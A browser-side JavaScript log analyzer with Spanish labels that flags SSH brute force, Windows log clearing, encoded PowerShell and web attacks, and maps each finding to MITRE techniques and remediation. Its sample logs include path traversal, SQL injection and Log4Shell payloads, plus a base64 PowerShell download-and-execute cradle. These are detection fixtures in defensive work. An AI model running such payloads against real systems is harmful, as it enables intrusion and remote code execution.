/* Analizador heurístico de logs (100 % local, sin envío de datos) */
(function () {
  const $ = id => document.getElementById(id);
  if (!$('analyze')) return;
  const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

  const SAMPLE = `Nov 26 10:13:40 web01 sshd[2201]: Failed password for maria from 192.168.56.80 port 41022 ssh2
Nov 26 10:14:01 web01 sshd[2228]: Failed password for root from 203.0.113.45 port 50116 ssh2
Nov 26 10:14:01 web01 sshd[2229]: Failed password for invalid user admin from 203.0.113.45 port 50118 ssh2
Nov 26 10:14:02 web01 sshd[2231]: Failed password for root from 203.0.113.45 port 50122 ssh2
Nov 26 10:14:02 web01 sshd[2232]: Failed password for invalid user oracle from 203.0.113.45 port 50124 ssh2
Nov 26 10:14:03 web01 sshd[2233]: Failed password for invalid user test from 203.0.113.45 port 50126 ssh2
Nov 26 10:14:03 web01 sshd[2234]: Failed password for invalid user backup from 203.0.113.45 port 50128 ssh2
Nov 26 10:14:04 web01 sshd[2235]: Failed password for backup from 203.0.113.45 port 50130 ssh2
Nov 26 10:14:05 web01 sshd[2236]: Failed password for backup from 203.0.113.45 port 50132 ssh2
Nov 26 10:31:07 web01 sshd[2390]: Accepted password for backup from 203.0.113.45 port 50290 ssh2
198.51.100.7 - - [26/Nov/2026:10:47:19 +0100] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1532 "-" "Mozilla/5.0"
198.51.100.7 - - [26/Nov/2026:10:47:22 +0100] "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 312 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
198.51.100.7 - - [26/Nov/2026:10:47:25 +0100] "GET /?x=\${jndi:ldap://198.51.100.7:1389/a} HTTP/1.1" 200 812 "-" "\${jndi:ldap://198.51.100.7:1389/a}"
192.0.2.15 - - [26/Nov/2026:10:50:01 +0100] "GET /admin/ HTTP/1.1" 404 196 "-" "Mozilla/5.00 (Nikto/2.5.0)"
EventID=4625 TargetUserName=administrador IpAddress=192.168.56.77 LogonType=3
EventID=4625 TargetUserName=jgarcia IpAddress=192.168.56.77 LogonType=3
EventID=4625 TargetUserName=mlopez IpAddress=192.168.56.77 LogonType=3
EventID=1102 SubjectUserName=svc_backup The audit log was cleared
EventID=4688 NewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhACcAKQA=`;

  function decodePS(b64) {
    try { const bin = atob(b64); let s = ''; for (let i = 0; i + 1 < bin.length; i += 2) s += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8)); return s; } catch (e) { return null; }
  }

  function analyze(text) {
    const lines = text.split(/\r?\n/).filter(Boolean);
    const F = [];
    const add = (sev, title, detail, mitre, rec) => F.push({ sev, title, detail, mitre, rec });
    // SSH
    const fails = {}, users = {}, ok = {};
    lines.forEach(l => {
      let m = l.match(/Failed (?:password|publickey) for (?:invalid user )?(\S+) from (\d+\.\d+\.\d+\.\d+)/);
      if (m) { fails[m[2]] = (fails[m[2]] || 0) + 1; (users[m[2]] = users[m[2]] || new Set()).add(m[1]); }
      m = l.match(/Accepted (?:password|publickey) for (\S+) from (\d+\.\d+\.\d+\.\d+)/);
      if (m) (ok[m[2]] = ok[m[2]] || []).push(m[1]);
    });
    Object.entries(fails).sort((a, b) => b[1] - a[1]).forEach(([ip, n]) => {
      const u = users[ip].size;
      if (ok[ip]) add('crit', `Acceso SSH EXITOSO tras ${n} fallos desde ${ip}`, `Cuenta(s) comprometida(s): <b>${esc(ok[ip].join(', '))}</b>. ${u} usuarios probados.`, 'T1110 Brute Force → T1078 Valid Accounts', 'Bloquear la IP, deshabilitar/rotar la cuenta, revisar qué hizo (history, procesos, conexiones) y abrir incidente.');
      else if (n >= 5) add(u >= 4 ? 'high' : 'med', `${u >= 4 ? 'Password spraying' : 'Fuerza bruta'} SSH desde ${ip}`, `${n} fallos contra ${u} usuario(s): ${esc([...users[ip]].slice(0, 6).join(', '))}${u > 6 ? '…' : ''}`, 'T1110.001 / T1110.003', 'Bloquear la IP (fail2ban), deshabilitar login por contraseña y root, usar claves + MFA.');
      else if (n >= 1 && !/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) add('low', `Fallos SSH aislados desde IP externa ${ip}`, `${n} fallo(s).`, 'T1110', 'Vigilar; valorar restringir SSH a VPN.');
    });
    // Windows
    const w4625 = {}, w4625u = {};
    lines.forEach(l => {
      if (/\b4625\b/.test(l)) { const ip = (l.match(/(?:IpAddress|Source Network Address)[=:\s]+(\d+\.\d+\.\d+\.\d+)/i) || [])[1] || 'desconocida'; w4625[ip] = (w4625[ip] || 0) + 1; const u = (l.match(/TargetUserName[=:\s]+(\S+)/i) || [])[1]; if (u) (w4625u[ip] = w4625u[ip] || new Set()).add(u); }
    });
    Object.entries(w4625).forEach(([ip, n]) => { const u = w4625u[ip]?.size || 0; add(u >= 3 ? 'high' : 'med', `Inicios de sesión fallidos de Windows (4625) desde ${ip}`, `${n} fallos, ${u} cuentas distintas${u >= 3 ? ' → patrón de password spraying' : ''}.`, 'T1110.003 Password Spraying', 'Identificar el equipo origen, comprobar 4624 posteriores, bloquear y revisar si el equipo está comprometido.'); });
    if (lines.some(l => /\b1102\b/.test(l) && /clear|borrad|EventID/i.test(l))) add('crit', 'Registro de seguridad BORRADO (1102)', 'Casi siempre indica un atacante eliminando huellas.', 'T1070.001 Clear Windows Event Logs', 'Tratar como incidente: identificar la cuenta, revisar logs reenviados al SIEM (por eso hay que centralizarlos).');
    if (lines.some(l => /\b4720\b/.test(l))) add('med', 'Cuenta de usuario creada (4720)', 'Verifica que el alta esté autorizada.', 'T1136 Create Account', 'Contrastar con tickets de alta.');
    if (lines.some(l => /\b7045\b/.test(l))) add('med', 'Servicio instalado (7045)', 'Puede ser persistencia o PsExec.', 'T1543.003', 'Revisar el binario del servicio y su firma.');
    // PowerShell
    lines.forEach(l => {
      const m = l.match(/-(?:e|en|enc|enco|encodedcommand)\s+([A-Za-z0-9+/=]{16,})/i);
      if (m) {
        const dec = decodePS(m[1]) || '(no se pudo decodificar)';
        const bad = /(IEX|Invoke-Expression|DownloadString|DownloadFile|Net\.WebClient|FromBase64String|Invoke-WebRequest|bypass|-w hidden|Start-BitsTransfer)/i.test(dec + l);
        const parentOffice = /(WINWORD|EXCEL|POWERPNT|OUTLOOK)\.EXE/i.test(l);
        add(bad || parentOffice ? 'crit' : 'high', `PowerShell codificado${parentOffice ? ' lanzado por Office' : ''}`, `Decodificado: <code>${esc(dec.slice(0, 300))}</code>`, 'T1059.001 PowerShell' + (parentOffice ? ' · T1566.001 Phishing adjunto' : ''), 'Aislar el equipo desde el EDR (sin apagarlo), bloquear los dominios/IPs del comando, buscar el mismo patrón en toda la red.');
      }
    });
    // Web
    const web = { trav: [], sqli: [], xss: [], log4j: [], scan: {}, e404: {} };
    lines.forEach(l => {
      const m = l.match(/^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(\S+) (\S+)[^"]*" (\d{3})/);
      if (!m) return;
      const [, ip, , url, st] = m; let u; try { u = decodeURIComponent(url); } catch (e) { u = url; }
      if (/\.\.\/|\.\.%2f|\/etc\/passwd|win\.ini/i.test(u)) web.trav.push(ip);
      if (/union(\s|\+)+select|'\s*or\s*'?1'?\s*=\s*'?1|sleep\(\d|information_schema|benchmark\(/i.test(u)) web.sqli.push(ip);
      if (/<script|javascript:|onerror=/i.test(u)) web.xss.push(ip);
      if (/\$\{jndi:/i.test(l)) web.log4j.push(ip);
      const ua = (l.match(/"([^"]*)"\s*$/) || [])[1] || '';
      const sc = ua.match(/sqlmap|nikto|nmap|masscan|zgrab|gobuster|dirbuster|wpscan|nuclei|acunetix|hydra/i);
      if (sc) web.scan[ip] = sc[0];
      if (st === '404') web.e404[ip] = (web.e404[ip] || 0) + 1;
    });
    const uniq = a => [...new Set(a)].join(', ');
    if (web.log4j.length) add('crit', 'Intento de explotación Log4Shell (${jndi:)', `Desde: ${uniq(web.log4j)}`, 'T1190 Exploit Public-Facing Application (CVE-2021-44228)', 'Verificar versiones de Log4j, bloquear la IP, buscar conexiones LDAP/RMI salientes desde el servidor.');
    if (web.sqli.length) add('high', 'Intentos de inyección SQL', `Desde: ${uniq(web.sqli)}`, 'T1190', 'Revisar respuestas 200/500 a esas URLs, consultas parametrizadas, WAF.');
    if (web.trav.length) add('high', 'Path traversal / lectura de ficheros', `Desde: ${uniq(web.trav)}. Si la respuesta fue 200, podría haber tenido éxito.`, 'T1190 / T1083', 'Comprobar el tamaño de la respuesta, corregir la validación de rutas.');
    if (web.xss.length) add('med', 'Intentos de XSS', `Desde: ${uniq(web.xss)}`, 'T1189', 'Codificación de salida, CSP.');
    Object.entries(web.scan).forEach(([ip, t]) => add('med', `Escáner automático (${t}) desde ${ip}`, 'Reconocimiento activo contra la web.', 'T1595 Active Scanning', 'Bloquear o limitar la IP; comprobar si además hubo explotación.'));
    Object.entries(web.e404).filter(([, n]) => n >= 20).forEach(([ip, n]) => add('med', `Fuerza bruta de directorios desde ${ip}`, `${n} respuestas 404.`, 'T1595.003', 'Rate limiting / WAF.'));
    const order = { crit: 0, high: 1, med: 2, low: 3 };
    F.sort((a, b) => order[a.sev] - order[b.sev]);
    return { F, n: lines.length };
  }

  function render({ F, n }) {
    const lab = { crit: 'CRÍTICO', high: 'ALTO', med: 'MEDIO', low: 'BAJO' };
    if (!F.length) { $('report').innerHTML = `<p class="muted">${n} líneas analizadas. No se encontraron patrones conocidos. Recuerda: “sin alertas” no significa “sin ataque”.</p>`; window.lastReport = ''; return; }
    const cnt = s => F.filter(f => f.sev === s).length;
    $('report').innerHTML = `<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px"><span class="sev crit">${cnt('crit')} crítico</span><span class="sev high">${cnt('high')} alto</span><span class="sev med">${cnt('med')} medio</span><span class="sev low">${cnt('low')} bajo</span><span class="muted" style="font-size:.8rem;margin-left:auto">${n} líneas · análisis local</span></div>` +
      F.map(f => `<div style="border-left:3px solid var(--${f.sev === 'crit' ? 'bad' : f.sev === 'high' ? 'warn' : f.sev === 'med' ? 'accent2' : 'ok'});padding:8px 12px;margin:10px 0;background:var(--bg2);border-radius:8px"><div><span class="sev ${f.sev}">${lab[f.sev]}</span> <b>${esc(f.title)}</b></div><div class="muted" style="font-size:.88rem;margin-top:4px">${f.detail}</div><div style="font-size:.8rem;margin-top:4px"><span class="tag p">${esc(f.mitre)}</span></div><div style="font-size:.85rem;margin-top:4px">➡️ ${esc(f.rec)}</div></div>`).join('');
    window.lastReport = F.map(f => `[${lab[f.sev]}] ${f.title} — ${f.detail.replace(/<[^>]+>/g, '')} (MITRE: ${f.mitre})`).join('\n');
  }

  $('sample').onclick = () => { $('logs').value = SAMPLE; render(analyze(SAMPLE)); };
  $('analyze').onclick = () => render(analyze($('logs').value));
})();
